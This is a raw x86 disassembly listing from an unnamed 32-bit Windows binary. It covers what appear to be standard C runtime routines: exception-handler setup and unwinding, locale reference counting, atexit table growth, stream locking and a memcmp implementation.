  42eeab:	mov    eax,DWORD PTR [ebp+0xc]
  42eeae:	push   DWORD PTR [eax+0x14]
  42eeb1:	mov    eax,DWORD PTR [ebp+0xc]
  42eeb4:	push   DWORD PTR [eax+0xc]
  42eeb7:	push   0x0
  42eeb9:	push   DWORD PTR [ebp+0x10]
  42eebc:	mov    eax,DWORD PTR [ebp+0xc]
  42eebf:	push   DWORD PTR [eax+0x10]
  42eec2:	push   DWORD PTR [ebp+0x8]
  42eec5:	call   0x430836
  42eeca:	add    esp,0x20
  42eecd:	mov    eax,DWORD PTR [ebp+0xc]
  42eed0:	cmp    DWORD PTR [eax+0x24],0x0
  42eed4:	jne    0x42eee1
  42eed6:	push   DWORD PTR [ebp+0x8]
  42eed9:	push   DWORD PTR [ebp+0xc]
  42eedc:	call   0x42ecd4
  42eee1:	push   0x0
  42eee3:	push   0x0
  42eee5:	push   0x0
  42eee7:	push   0x0
  42eee9:	push   0x0
  42eeeb:	lea    eax,[ebp-0x4]
  42eeee:	push   eax
  42eeef:	push   0x123
  42eef4:	call   0x42ed97
  42eef9:	add    esp,0x1c
  42eefc:	mov    eax,DWORD PTR [ebp-0x4]
  42eeff:	mov    ebx,DWORD PTR [ebp+0xc]
  42ef02:	mov    esp,DWORD PTR [ebx+0x1c]
  42ef05:	mov    ebp,DWORD PTR [ebx+0x20]
  42ef08:	jmp    eax
  42ef0a:	xor    eax,eax
  42ef0c:	inc    eax
  42ef0d:	pop    ebx
  42ef0e:	leave  
  42ef0f:	ret    
  42ef10:	push   ebp
  42ef11:	mov    ebp,esp
  42ef13:	push   ecx
  42ef14:	cmp    DWORD PTR [ebp+0xc],0x0
  42ef18:	push   ebx
  42ef19:	push   esi
  42ef1a:	push   edi
  42ef1b:	mov    edi,DWORD PTR [ebp+0x8]
  42ef1e:	mov    esi,DWORD PTR [edi+0xc]
  42ef21:	mov    ebx,DWORD PTR [edi+0x10]
  42ef24:	mov    eax,esi
  42ef26:	mov    DWORD PTR [ebp-0x4],eax
  42ef29:	mov    DWORD PTR [ebp+0x8],esi
  42ef2c:	jl     0x42ef66
  42ef2e:	cmp    esi,0xffffffff
  42ef31:	jne    0x42ef38
  42ef33:	call   0x433c22
  42ef38:	mov    ecx,DWORD PTR [ebp+0x10]
  42ef3b:	dec    esi
  42ef3c:	lea    eax,[esi+esi*4]
  42ef3f:	lea    eax,[ebx+eax*4]
  42ef42:	cmp    DWORD PTR [eax+0x4],ecx
  42ef45:	jge    0x42ef4c
  42ef47:	cmp    ecx,DWORD PTR [eax+0x8]
  42ef4a:	jle    0x42ef51
  42ef4c:	cmp    esi,0xffffffff
  42ef4f:	jne    0x42ef5d
  42ef51:	mov    eax,DWORD PTR [ebp+0x8]
  42ef54:	dec    DWORD PTR [ebp+0xc]
  42ef57:	mov    DWORD PTR [ebp-0x4],eax
  42ef5a:	mov    DWORD PTR [ebp+0x8],esi
  42ef5d:	cmp    DWORD PTR [ebp+0xc],0x0
  42ef61:	jge    0x42ef2e
  42ef63:	mov    eax,DWORD PTR [ebp-0x4]
  42ef66:	mov    ecx,DWORD PTR [ebp+0x14]
  42ef69:	inc    esi
  42ef6a:	mov    DWORD PTR [ecx],esi
  42ef6c:	mov    ecx,DWORD PTR [ebp+0x18]
  42ef6f:	mov    DWORD PTR [ecx],eax
  42ef71:	cmp    eax,DWORD PTR [edi+0xc]
  42ef74:	ja     0x42ef7a
  42ef76:	cmp    esi,eax
  42ef78:	jbe    0x42ef7f
  42ef7a:	call   0x433c22
  42ef7f:	pop    edi
  42ef80:	lea    eax,[esi+esi*4]
  42ef83:	pop    esi
  42ef84:	lea    eax,[ebx+eax*4]
  42ef87:	pop    ebx
  42ef88:	leave  
  42ef89:	ret    
  42ef8a:	mov    eax,DWORD PTR [esp+0x8]
  42ef8e:	push   esi
  42ef8f:	mov    esi,DWORD PTR [esp+0x8]
  42ef93:	mov    DWORD PTR [esi],eax
  42ef95:	call   0x433901
  42ef9a:	mov    eax,DWORD PTR [eax+0x88]
  42efa0:	mov    DWORD PTR [esi+0x4],eax
  42efa3:	call   0x433901
  42efa8:	mov    DWORD PTR [eax+0x88],esi
  42efae:	mov    eax,esi
  42efb0:	pop    esi
  42efb1:	ret    
  42efb2:	call   0x433901
  42efb7:	mov    eax,DWORD PTR [eax+0x88]
  42efbd:	jmp    0x42efca
  42efbf:	mov    ecx,DWORD PTR [eax]
  42efc1:	cmp    ecx,DWORD PTR [esp+0x4]
  42efc5:	je     0x42efd0
  42efc7:	mov    eax,DWORD PTR [eax+0x4]
  42efca:	test   eax,eax
  42efcc:	jne    0x42efbf
  42efce:	inc    eax
  42efcf:	ret    
  42efd0:	xor    eax,eax
  42efd2:	ret    
  42efd3:	push   esi
  42efd4:	call   0x433901
  42efd9:	mov    esi,DWORD PTR [esp+0x8]
  42efdd:	cmp    esi,DWORD PTR [eax+0x88]
  42efe3:	jne    0x42eff5
  42efe5:	call   0x433901
  42efea:	mov    ecx,DWORD PTR [esi+0x4]
  42efed:	mov    DWORD PTR [eax+0x88],ecx
  42eff3:	pop    esi
  42eff4:	ret    
  42eff5:	call   0x433901
  42effa:	mov    eax,DWORD PTR [eax+0x88]
  42f000:	jmp    0x42f00b
  42f002:	mov    ecx,DWORD PTR [eax+0x4]
  42f005:	cmp    esi,ecx
  42f007:	je     0x42f017
  42f009:	mov    eax,ecx
  42f00b:	cmp    DWORD PTR [eax+0x4],0x0
  42f00f:	jne    0x42f002
  42f011:	pop    esi
  42f012:	jmp    0x433c22
  42f017:	mov    ecx,DWORD PTR [esi+0x4]
  42f01a:	mov    DWORD PTR [eax+0x4],ecx
  42f01d:	pop    esi
  42f01e:	ret    
  42f01f:	push   ebp
  42f020:	mov    ebp,esp
  42f022:	sub    esp,0x18
  42f025:	mov    eax,ds:0x43d404
  42f02a:	and    DWORD PTR [ebp-0x18],0x0
  42f02e:	mov    ecx,DWORD PTR [ebp+0x8]
  42f031:	mov    DWORD PTR [ebp-0x10],eax
  42f034:	mov    eax,DWORD PTR [ebp+0xc]
  42f037:	mov    DWORD PTR [ebp-0xc],eax
  42f03a:	mov    eax,DWORD PTR [ebp+0x14]
  42f03d:	inc    eax
  42f03e:	mov    DWORD PTR [ebp-0x14],0x42ed5c
  42f045:	mov    DWORD PTR [ebp-0x8],ecx
  42f048:	mov    DWORD PTR [ebp-0x4],eax
  42f04b:	mov    eax,fs:0x0
  42f051:	mov    DWORD PTR [ebp-0x18],eax
  42f054:	lea    eax,[ebp-0x18]
  42f057:	mov    fs:0x0,eax
  42f05d:	push   DWORD PTR [ebp+0x18]
  42f060:	push   ecx
  42f061:	push   DWORD PTR [ebp+0x10]
  42f064:	call   0x433c50
  42f069:	mov    ecx,eax
  42f06b:	mov    eax,DWORD PTR [ebp-0x18]
  42f06e:	mov    fs:0x0,eax
  42f074:	mov    eax,ecx
  42f076:	leave  
  42f077:	ret    
  42f078:	push   ebp
  42f079:	mov    ebp,esp
  42f07b:	push   ebx
  42f07c:	push   esi
  42f07d:	push   edi
  42f07e:	push   ebp
  42f07f:	push   0x0
  42f081:	push   0x0
  42f083:	push   0x42f090
  42f088:	push   DWORD PTR [ebp+0x8]
  42f08b:	call   0x437f4e
  42f090:	pop    ebp
  42f091:	pop    edi
  42f092:	pop    esi
  42f093:	pop    ebx
  42f094:	mov    esp,ebp
  42f096:	pop    ebp
  42f097:	ret    
  42f098:	mov    ecx,DWORD PTR [esp+0x4]
  42f09c:	test   DWORD PTR [ecx+0x4],0x6
  42f0a3:	mov    eax,0x1
  42f0a8:	je     0x42f0b9
  42f0aa:	mov    eax,DWORD PTR [esp+0x8]
  42f0ae:	mov    edx,DWORD PTR [esp+0x10]
  42f0b2:	mov    DWORD PTR [edx],eax
  42f0b4:	mov    eax,0x3
  42f0b9:	ret    
  42f0ba:	push   ebx
  42f0bb:	push   esi
  42f0bc:	push   edi
  42f0bd:	mov    eax,DWORD PTR [esp+0x10]
  42f0c1:	push   eax
  42f0c2:	push   0xfffffffe
  42f0c4:	push   0x42f098
  42f0c9:	push   DWORD PTR fs:0x0
  42f0d0:	mov    DWORD PTR fs:0x0,esp
  42f0d7:	mov    eax,DWORD PTR [esp+0x20]
  42f0db:	mov    ebx,DWORD PTR [eax+0x8]
  42f0de:	mov    esi,DWORD PTR [eax+0xc]
  42f0e1:	cmp    esi,0xffffffff
  42f0e4:	je     0x42f114
  42f0e6:	cmp    esi,DWORD PTR [esp+0x24]
  42f0ea:	je     0x42f114
  42f0ec:	lea    esi,[esi+esi*2]
  42f0ef:	mov    ecx,DWORD PTR [ebx+esi*4]
  42f0f2:	mov    DWORD PTR [esp+0x8],ecx
  42f0f6:	mov    DWORD PTR [eax+0xc],ecx
  42f0f9:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  42f0fe:	jne    0x42f112
  42f100:	push   0x101
  42f105:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  42f109:	call   0x42f14e
  42f10e:	call   DWORD PTR [ebx+esi*4+0x8]
  42f112:	jmp    0x42f0d7
  42f114:	pop    DWORD PTR fs:0x0
  42f11b:	add    esp,0xc
  42f11e:	pop    edi
  42f11f:	pop    esi
  42f120:	pop    ebx
  42f121:	ret    
  42f122:	xor    eax,eax
  42f124:	mov    ecx,DWORD PTR fs:0x0
  42f12b:	cmp    DWORD PTR [ecx+0x4],0x42f098
  42f132:	jne    0x42f144
  42f134:	mov    edx,DWORD PTR [ecx+0xc]
  42f137:	mov    edx,DWORD PTR [edx+0xc]
  42f13a:	cmp    DWORD PTR [ecx+0x8],edx
  42f13d:	jne    0x42f144
  42f13f:	mov    eax,0x1
  42f144:	ret    
  42f145:	push   ebx
  42f146:	push   ecx
  42f147:	mov    ebx,0x43d3f0
  42f14c:	jmp    0x42f158
  42f14e:	push   ebx
  42f14f:	push   ecx
  42f150:	mov    ebx,0x43d3f0
  42f155:	mov    ecx,DWORD PTR [ebp+0x8]
  42f158:	mov    DWORD PTR [ebx+0x8],ecx
  42f15b:	mov    DWORD PTR [ebx+0x4],eax
  42f15e:	mov    DWORD PTR [ebx+0xc],ebp
  42f161:	pop    ecx
  42f162:	pop    ebx
  42f163:	ret    0x4
  42f166:	int3   
  42f167:	int3   
  42f168:	push   0xffffffff
  42f16a:	push   eax
  42f16b:	mov    eax,fs:0x0
  42f171:	push   eax
  42f172:	mov    eax,DWORD PTR [esp+0xc]
  42f176:	mov    DWORD PTR fs:0x0,esp
  42f17d:	mov    DWORD PTR [esp+0xc],ebp
  42f181:	lea    ebp,[esp+0xc]
  42f185:	push   eax
  42f186:	ret    
  42f187:	push   ebp
  42f188:	mov    ebp,esp
  42f18a:	sub    esp,0x20
  42f18d:	mov    eax,DWORD PTR [ebp+0x8]
  42f190:	push   esi
  42f191:	push   edi
  42f192:	push   0x8
  42f194:	pop    ecx
  42f195:	mov    esi,0x4394cc
  42f19a:	lea    edi,[ebp-0x20]
  42f19d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f19f:	mov    DWORD PTR [ebp-0x8],eax
  42f1a2:	mov    eax,DWORD PTR [ebp+0xc]
  42f1a5:	mov    DWORD PTR [ebp-0x4],eax
  42f1a8:	lea    eax,[ebp-0xc]
  42f1ab:	push   eax
  42f1ac:	push   DWORD PTR [ebp-0x10]
  42f1af:	push   DWORD PTR [ebp-0x1c]
  42f1b2:	push   DWORD PTR [ebp-0x20]
  42f1b5:	call   DWORD PTR ds:0x439098
  42f1bb:	pop    edi
  42f1bc:	pop    esi
  42f1bd:	leave  
  42f1be:	ret    0x8
  42f1c1:	push   0x8
  42f1c3:	push   0x4394f0
  42f1c8:	call   0x431210
  42f1cd:	and    DWORD PTR [ebp-0x4],0x0
  42f1d1:	push   0x0
  42f1d3:	push   0x1
  42f1d5:	call   0x433d70
  42f1da:	pop    ecx
  42f1db:	pop    ecx
  42f1dc:	jmp    0x42f1e5
  42f1de:	xor    eax,eax
  42f1e0:	inc    eax
  42f1e1:	ret    
  42f1e2:	mov    esp,DWORD PTR [ebp-0x18]
  42f1e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  42f1e9:	push   0x3
  42f1eb:	call   DWORD PTR ds:0x43909c
  42f1f1:	int3   
  42f1f2:	cmp    ecx,DWORD PTR ds:0x43d404
  42f1f8:	jne    0x42f1fb
  42f1fa:	ret    
  42f1fb:	jmp    0x42f1c1
  42f200:	push   esi
  42f201:	push   DWORD PTR ds:0x465208
  42f207:	call   0x434065
  42f20c:	pop    ecx
  42f20d:	mov    ecx,DWORD PTR ds:0x465204
  42f213:	mov    esi,eax
  42f215:	mov    eax,ds:0x465208
  42f21a:	mov    edx,ecx
  42f21c:	sub    edx,eax
  42f21e:	add    edx,0x4
  42f221:	cmp    esi,edx
  42f223:	jae    0x42f273
  42f225:	mov    ecx,0x800
  42f22a:	cmp    esi,ecx
  42f22c:	jae    0x42f230
  42f22e:	mov    ecx,esi
  42f230:	add    ecx,esi
  42f232:	push   ecx
  42f233:	push   eax
  42f234:	call   0x433eb8
  42f239:	test   eax,eax
  42f23b:	pop    ecx
  42f23c:	pop    ecx
  42f23d:	jne    0x42f256
  42f23f:	add    esi,0x10
  42f242:	push   esi
  42f243:	push   DWORD PTR ds:0x465208
  42f249:	call   0x433eb8
  42f24e:	test   eax,eax
  42f250:	pop    ecx
  42f251:	pop    ecx
  42f252:	jne    0x42f256
  42f254:	pop    esi
  42f255:	ret    
  42f256:	mov    ecx,DWORD PTR ds:0x465204
  42f25c:	sub    ecx,DWORD PTR ds:0x465208
  42f262:	mov    ds:0x465208,eax
  42f267:	sar    ecx,0x2
  42f26a:	lea    ecx,[eax+ecx*4]
  42f26d:	mov    DWORD PTR ds:0x465204,ecx
  42f273:	mov    DWORD PTR [ecx],edi
  42f275:	add    DWORD PTR ds:0x465204,0x4
  42f27c:	mov    eax,edi
  42f27e:	pop    esi
  42f27f:	ret    
  42f280:	push   0x80
  42f285:	call   0x4311fe
  42f28a:	test   eax,eax
  42f28c:	pop    ecx
  42f28d:	mov    ds:0x465208,eax
  42f292:	jne    0x42f298
  42f294:	push   0x18
  42f296:	pop    eax
  42f297:	ret    
  42f298:	and    DWORD PTR [eax],0x0
  42f29b:	mov    eax,ds:0x465208
  42f2a0:	mov    ds:0x465204,eax
  42f2a5:	xor    eax,eax
  42f2a7:	ret    
  42f2a8:	push   0xc
  42f2aa:	push   0x439500
  42f2af:	call   0x431210
  42f2b4:	call   0x432d56
  42f2b9:	and    DWORD PTR [ebp-0x4],0x0
  42f2bd:	mov    edi,DWORD PTR [ebp+0x8]
  42f2c0:	call   0x42f200
  42f2c5:	mov    DWORD PTR [ebp-0x1c],eax
  42f2c8:	or     DWORD PTR [ebp-0x4],0xffffffff
  42f2cc:	call   0x42f2da
  42f2d1:	mov    eax,DWORD PTR [ebp-0x1c]
  42f2d4:	call   0x43124b
  42f2d9:	ret    
  42f2da:	call   0x432d5f
  42f2df:	ret    
  42f2e0:	push   DWORD PTR [esp+0x4]
  42f2e4:	call   0x42f2a8
  42f2e9:	neg    eax
  42f2eb:	sbb    eax,eax
  42f2ed:	neg    eax
  42f2ef:	pop    ecx
  42f2f0:	dec    eax
  42f2f1:	ret    
  42f2f2:	mov    eax,0x43d408
  42f2f7:	ret    
  42f2f8:	mov    eax,ds:0x466260
  42f2fd:	test   eax,eax
  42f2ff:	push   esi
  42f300:	push   0x14
  42f302:	pop    esi
  42f303:	jne    0x42f30c
  42f305:	mov    eax,0x200
  42f30a:	jmp    0x42f312
  42f30c:	cmp    eax,esi
  42f30e:	jge    0x42f317
  42f310:	mov    eax,esi
  42f312:	mov    ds:0x466260,eax
  42f317:	push   0x4
  42f319:	push   eax
  42f31a:	call   0x4340db
  42f31f:	test   eax,eax
  42f321:	pop    ecx
  42f322:	pop    ecx
  42f323:	mov    ds:0x465248,eax
  42f328:	jne    0x42f348
  42f32a:	push   0x4
  42f32c:	push   esi
  42f32d:	mov    DWORD PTR ds:0x466260,esi
  42f333:	call   0x4340db
  42f338:	test   eax,eax
  42f33a:	pop    ecx
  42f33b:	pop    ecx
  42f33c:	mov    ds:0x465248,eax
  42f341:	jne    0x42f348
  42f343:	push   0x1a
  42f345:	pop    eax
  42f346:	pop    esi
  42f347:	ret    
  42f348:	xor    edx,edx
  42f34a:	mov    ecx,0x43d408
  42f34f:	jmp    0x42f356
  42f351:	mov    eax,ds:0x465248
  42f356:	mov    DWORD PTR [edx+eax*1],ecx
  42f359:	add    ecx,0x20
  42f35c:	add    edx,0x4
  42f35f:	cmp    ecx,0x43d688
  42f365:	jl     0x42f351
  42f367:	xor    ecx,ecx
  42f369:	mov    edx,0x43d418
  42f36e:	mov    esi,ecx
  42f370:	mov    eax,ecx
  42f372:	and    eax,0x1f
  42f375:	sar    esi,0x5
  42f378:	mov    esi,DWORD PTR [esi*4+0x465100]
  42f37f:	lea    eax,[eax+eax*8]
  42f382:	mov    eax,DWORD PTR [esi+eax*4]
  42f385:	cmp    eax,0xffffffff
  42f388:	je     0x42f38e
  42f38a:	test   eax,eax
  42f38c:	jne    0x42f391
  42f38e:	or     DWORD PTR [edx],0xffffffff
  42f391:	add    edx,0x20
  42f394:	inc    ecx
  42f395:	cmp    edx,0x43d478
  42f39b:	jl     0x42f36e
  42f39d:	xor    eax,eax
  42f39f:	pop    esi
  42f3a0:	ret    
  42f3a1:	call   0x42e46e
  42f3a6:	cmp    BYTE PTR ds:0x43fce8,0x0
  42f3ad:	je     0x42f3b4
  42f3af:	jmp    0x434196
  42f3b4:	ret    
  42f3b5:	mov    eax,DWORD PTR [esp+0x4]
  42f3b9:	mov    ecx,0x43d408
  42f3be:	cmp    eax,ecx
  42f3c0:	jb     0x42f3d9
  42f3c2:	cmp    eax,0x43d668
  42f3c7:	ja     0x42f3d9
  42f3c9:	sub    eax,ecx
  42f3cb:	sar    eax,0x5
  42f3ce:	add    eax,0x10
  42f3d1:	push   eax
  42f3d2:	call   0x431126
  42f3d7:	pop    ecx
  42f3d8:	ret    
  42f3d9:	add    eax,0x20
  42f3dc:	push   eax
  42f3dd:	call   DWORD PTR ds:0x439088
  42f3e3:	ret    
  42f3e4:	mov    eax,DWORD PTR [esp+0x4]
  42f3e8:	cmp    eax,0x14
  42f3eb:	jge    0x42f3f8
  42f3ed:	add    eax,0x10
  42f3f0:	push   eax
  42f3f1:	call   0x431126
  42f3f6:	pop    ecx
  42f3f7:	ret    
  42f3f8:	mov    eax,DWORD PTR [esp+0x8]
  42f3fc:	add    eax,0x20
  42f3ff:	push   eax
  42f400:	call   DWORD PTR ds:0x439088
  42f406:	ret    
  42f407:	mov    eax,DWORD PTR [esp+0x4]
  42f40b:	mov    ecx,0x43d408
  42f410:	cmp    eax,ecx
  42f412:	jb     0x42f42b
  42f414:	cmp    eax,0x43d668
  42f419:	ja     0x42f42b
  42f41b:	sub    eax,ecx
  42f41d:	sar    eax,0x5
  42f420:	add    eax,0x10
  42f423:	push   eax
  42f424:	call   0x431071
  42f429:	pop    ecx
  42f42a:	ret    
  42f42b:	add    eax,0x20
  42f42e:	push   eax
  42f42f:	call   DWORD PTR ds:0x43908c
  42f435:	ret    
  42f436:	mov    eax,DWORD PTR [esp+0x4]
  42f43a:	cmp    eax,0x14
  42f43d:	jge    0x42f44a
  42f43f:	add    eax,0x10
  42f442:	push   eax
  42f443:	call   0x431071
  42f448:	pop    ecx
  42f449:	ret    
  42f44a:	mov    eax,DWORD PTR [esp+0x8]
  42f44e:	add    eax,0x20
  42f451:	push   eax
  42f452:	call   DWORD PTR ds:0x43908c
  42f458:	ret    
  42f459:	int3   
  42f45a:	int3   
  42f45b:	int3   
  42f45c:	int3   
  42f45d:	int3   
  42f45e:	int3   
  42f45f:	int3   
  42f460:	mov    eax,DWORD PTR [esp+0xc]
  42f464:	test   eax,eax
  42f466:	je     0x42f4b2
  42f468:	mov    edx,DWORD PTR [esp+0x4]
  42f46c:	push   esi
  42f46d:	push   edi
  42f46e:	mov    esi,edx
  42f470:	mov    edi,DWORD PTR [esp+0x10]
  42f474:	or     edx,edi
  42f476:	and    edx,0x3
  42f479:	je     0x42f4b3
  42f47b:	test   eax,0x1
  42f480:	je     0x42f493
  42f482:	mov    cl,BYTE PTR [esi]
  42f484:	cmp    cl,BYTE PTR [edi]
  42f486:	jne    0x42f4e0
  42f488:	add    esi,0x1
  42f48b:	add    edi,0x1
  42f48e:	sub    eax,0x1
  42f491:	je     0x42f4b0
  42f493:	mov    cl,BYTE PTR [esi]
  42f495:	mov    dl,BYTE PTR [edi]
  42f497:	cmp    cl,dl
  42f499:	jne    0x42f4e0
  42f49b:	mov    cl,BYTE PTR [esi+0x1]
  42f49e:	mov    dl,BYTE PTR [edi+0x1]
  42f4a1:	cmp    cl,dl
  42f4a3:	jne    0x42f4e0
  42f4a5:	add    edi,0x2
  42f4a8:	add    esi,0x2
  42f4ab:	sub    eax,0x2
  42f4ae:	jne    0x42f493
  42f4b0:	pop    edi
  42f4b1:	pop    esi
  42f4b2:	ret    
  42f4b3:	mov    ecx,eax
  42f4b5:	and    eax,0x3
  42f4b8:	shr    ecx,0x2
  42f4bb:	je     0x42f4e8
  42f4bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f4bf:	je     0x42f4e8
  42f4c1:	mov    ecx,DWORD PTR [esi-0x4]
  42f4c4:	mov    edx,DWORD PTR [edi-0x4]
  42f4c7:	cmp    cl,dl
  42f4c9:	jne    0x42f4db
  42f4cb:	cmp    ch,dh
  42f4cd:	jne    0x42f4db
  42f4cf:	shr    ecx,0x10
  42f4d2:	shr    edx,0x10
  42f4d5:	cmp    cl,dl
  42f4d7:	jne    0x42f4db
  42f4d9:	cmp    ch,dh
  42f4db:	mov    eax,0x0
  42f4e0:	sbb    eax,eax
  42f4e2:	pop    edi
  42f4e3:	sbb    eax,0xffffffff
  42f4e6:	pop    esi
  42f4e7:	ret    
  42f4e8:	test   eax,eax
  42f4ea:	je     0x42f4b0
  42f4ec:	mov    edx,DWORD PTR [esi]
  42f4ee:	mov    ecx,DWORD PTR [edi]
  42f4f0:	cmp    dl,cl
  42f4f2:	jne    0x42f4db
  42f4f4:	sub    eax,0x1
  42f4f7:	je     0x42f515
  42f4f9:	cmp    dh,ch
  42f4fb:	jne    0x42f4db
  42f4fd:	sub    eax,0x1
  42f500:	je     0x42f515
  42f502:	and    ecx,0xff0000
  42f508:	and    edx,0xff0000
  42f50e:	cmp    edx,ecx
  42f510:	jne    0x42f4db
  42f512:	sub    eax,0x1
  42f515:	pop    edi
  42f516:	pop    esi
  42f517:	ret    
  42f518:	mov    eax,ds:0x465240
  42f51d:	ret    
  42f51e:	mov    eax,0x465244
  42f523:	ret    
  42f524:	push   esi
  42f525:	mov    esi,DWORD PTR [esp+0x8]
  42f529:	mov    eax,DWORD PTR [esi+0x3c]
  42f52c:	push   edi
  42f52d:	xor    edi,edi
  42f52f:	cmp    eax,DWORD PTR ds:0x43fe24
  42f535:	je     0x42f59a
  42f537:	cmp    eax,edi
  42f539:	je     0x42f59a
  42f53b:	mov    eax,DWORD PTR [esi+0x2c]
  42f53e:	cmp    DWORD PTR [eax],edi
  42f540:	jne    0x42f59a
  42f542:	mov    eax,DWORD PTR [esi+0x34]
  42f545:	cmp    eax,edi
  42f547:	je     0x42f565
  42f549:	cmp    DWORD PTR [eax],edi
  42f54b:	jne    0x42f565
  42f54d:	cmp    eax,DWORD PTR ds:0x4650e0
  42f553:	je     0x42f565
  42f555:	push   eax
  42f556:	call   0x42e0ed
  42f55b:	push   DWORD PTR [esi+0x3c]
  42f55e:	call   0x4349b3
  42f563:	pop    ecx
  42f564:	pop    ecx
  42f565:	mov    eax,DWORD PTR [esi+0x30]
  42f568:	cmp    eax,edi
  42f56a:	je     0x42f588
  42f56c:	cmp    DWORD PTR [eax],edi
  42f56e:	jne    0x42f588
  42f570:	cmp    eax,DWORD PTR ds:0x4650e8
  42f576:	je     0x42f588
  42f578:	push   eax
  42f579:	call   0x42e0ed
  42f57e:	push   DWORD PTR [esi+0x3c]
  42f581:	call   0x434787
  42f586:	pop    ecx
  42f587:	pop    ecx
  42f588:	push   DWORD PTR [esi+0x2c]
  42f58b:	call   0x42e0ed
  42f590:	push   DWORD PTR [esi+0x3c]
  42f593:	call   0x42e0ed
  42f598:	pop    ecx
  42f599:	pop    ecx
  42f59a:	mov    eax,DWORD PTR [esi+0x40]
  42f59d:	cmp    eax,DWORD PTR ds:0x46523c
  42f5a3:	je     0x42f5c3
  42f5a5:	cmp    eax,edi
  42f5a7:	je     0x42f5c3
  42f5a9:	cmp    DWORD PTR [eax],edi
  42f5ab:	jne    0x42f5c3
  42f5ad:	push   eax
  42f5ae:	call   0x42e0ed
  42f5b3:	mov    eax,DWORD PTR [esi+0x44]
  42f5b6:	sub    eax,0xfe
  42f5bb:	push   eax
  42f5bc:	call   0x42e0ed
  42f5c1:	pop    ecx
  42f5c2:	pop    ecx
  42f5c3:	mov    eax,DWORD PTR [esi+0x50]
  42f5c6:	cmp    eax,DWORD PTR ds:0x43fe20
  42f5cc:	je     0x42f5ea
  42f5ce:	cmp    eax,edi
  42f5d0:	je     0x42f5ea
  42f5d2:	cmp    DWORD PTR [eax+0xb4],edi
  42f5d8:	jne    0x42f5ea
  42f5da:	push   eax
  42f5db:	call   0x434598
  42f5e0:	push   DWORD PTR [esi+0x50]
  42f5e3:	call   0x42e0ed
  42f5e8:	pop    ecx
  42f5e9:	pop    ecx
  42f5ea:	push   esi
  42f5eb:	call   0x42e0ed
  42f5f0:	pop    ecx
  42f5f1:	pop    edi
  42f5f2:	pop    esi
  42f5f3:	ret    
  42f5f4:	push   esi
  42f5f5:	call   0x433901
  42f5fa:	mov    esi,eax
  42f5fc:	mov    ecx,DWORD PTR [esi+0x64]
  42f5ff:	cmp    ecx,DWORD PTR ds:0x43d6ec
  42f605:	je     0x42f6b0
  42f60b:	xor    edx,edx
  42f60d:	cmp    ecx,edx
  42f60f:	je     0x42f640
  42f611:	mov    eax,DWORD PTR [ecx+0x2c]
  42f614:	dec    DWORD PTR [ecx]
  42f616:	cmp    eax,edx
  42f618:	je     0x42f61c
  42f61a:	dec    DWORD PTR [eax]
  42f61c:	mov    eax,DWORD PTR [ecx+0x34]
  42f61f:	cmp    eax,edx
  42f621:	je     0x42f625
  42f623:	dec    DWORD PTR [eax]
  42f625:	mov    eax,DWORD PTR [ecx+0x30]
  42f628:	cmp    eax,edx
  42f62a:	je     0x42f62e
  42f62c:	dec    DWORD PTR [eax]
  42f62e:	mov    eax,DWORD PTR [ecx+0x40]
  42f631:	cmp    eax,edx
  42f633:	je     0x42f637
  42f635:	dec    DWORD PTR [eax]
  42f637:	mov    eax,DWORD PTR [ecx+0x4c]
  42f63a:	dec    DWORD PTR [eax+0xb4]
  42f640:	mov    eax,ds:0x43d6ec
  42f645:	mov    DWORD PTR [esi+0x64],eax
  42f648:	mov    eax,ds:0x43d6ec
  42f64d:	inc    DWORD PTR [eax]
  42f64f:	mov    eax,ds:0x43d6ec
  42f654:	cmp    DWORD PTR [eax+0x2c],edx
  42f657:	je     0x42f663
  42f659:	mov    eax,DWORD PTR [eax+0x2c]
  42f65c:	inc    DWORD PTR [eax]
  42f65e:	mov    eax,ds:0x43d6ec
  42f663:	cmp    DWORD PTR [eax+0x34],edx
  42f666:	je     0x42f672
  42f668:	mov    eax,DWORD PTR [eax+0x34]
  42f66b:	inc    DWORD PTR [eax]
  42f66d:	mov    eax,ds:0x43d6ec
  42f672:	cmp    DWORD PTR [eax+0x30],edx
  42f675:	je     0x42f681
  42f677:	mov    eax,DWORD PTR [eax+0x30]
  42f67a:	inc    DWORD PTR [eax]
  42f67c:	mov    eax,ds:0x43d6ec
  42f681:	cmp    DWORD PTR [eax+0x40],edx
  42f684:	je     0x42f690
  42f686:	mov    eax,DWORD PTR [eax+0x40]
  42f689:	inc    DWORD PTR [eax]
  42f68b:	mov    eax,ds:0x43d6ec
  42f690:	mov    eax,DWORD PTR [eax+0x4c]
  42f693:	inc    DWORD PTR [eax+0xb4]
  42f699:	cmp    ecx,edx
  42f69b:	je     0x42f6b0
  42f69d:	cmp    DWORD PTR [ecx],edx
  42f69f:	jne    0x42f6b0
  42f6a1:	cmp    ecx,0x43d698
  42f6a7:	je     0x42f6b0
  42f6a9:	push   ecx
  42f6aa:	call   0x42f524
  42f6af:	pop    ecx
  42f6b0:	mov    eax,DWORD PTR [esi+0x64]
  42f6b3:	pop    esi
  42f6b4:	ret    
  42f6b5:	push   edi
  42f6b6:	mov    edi,DWORD PTR [esp+0xc]
  42f6ba:	test   edi,edi
  42f6bc:	jle    0x42f6d7
  42f6be:	push   esi
  42f6bf:	lea    esi,[esp+0x10]
  42f6c3:	add    esi,0x4
  42f6c6:	push   DWORD PTR [esi]
  42f6c8:	push   DWORD PTR [esp+0x10]
  42f6cc:	call   0x432790
  42f6d1:	dec    edi
  42f6d2:	pop    ecx
  42f6d3:	pop    ecx
  42f6d4:	jne    0x42f6c3
  42f6d6:	pop    esi
  42f6d7:	pop    edi
  42f6d8:	ret    
  42f6d9:	push   ebp
  42f6da:	mov    ebp,esp
  42f6dc:	push   esi
  42f6dd:	push   edi
  42f6de:	mov    edi,DWORD PTR [ebp+0x8]
  42f6e1:	push   0x90
  42f6e6:	push   0x0
  42f6e8:	push   edi
  42f6e9:	call   0x42e4e0
  42f6ee:	mov    esi,DWORD PTR [ebp+0xc]
  42f6f1:	mov    al,BYTE PTR [esi]
  42f6f3:	add    esp,0xc
  42f6f6:	test   al,al
  42f6f8:	je     0x42f71f
  42f6fa:	cmp    al,0x2e
  42f6fc:	jne    0x42f726
  42f6fe:	lea    eax,[esi+0x1]
  42f701:	cmp    BYTE PTR [eax],0x0
  42f704:	je     0x42f726
